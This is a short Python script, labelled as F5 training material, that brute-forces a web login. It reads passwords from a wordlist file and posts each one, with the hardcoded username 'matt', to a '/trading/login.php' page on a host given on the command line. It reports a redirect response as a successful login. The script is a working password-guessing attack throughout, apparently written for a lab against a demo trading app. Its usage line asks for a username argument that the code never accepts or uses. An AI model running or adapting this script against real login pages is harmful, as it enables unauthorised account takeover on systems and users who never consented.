# Modified on May 11, 2023
# F5 Global Services Training

import sys
import requests


if len(sys.argv) != 2:
  print("usage: " + sys.argv[0] + " <FQDN> <username>")
  sys.exit()

url = 'http://' + sys.argv[1] + '/trading/login.php'
cookies = dict(language='en', cookieconsent_status='dismiss', io='')
pwdfile = 'arcadia_passwords.txt'

with open(pwdfile) as fp:
        for index, pwd in enumerate(fp):
                payload = {"username": "matt", "password": pwd.replace('\n', '')}
                r = requests.post(url, data=payload, cookies=cookies)
                print("{}: {}".format(str(payload), r.status_code))
                if r.status_code == 302:
                        print("Successful login: " + pwd)
                        print(r.content)
                        fp.close()
                        exit()

print("No successful login found!")
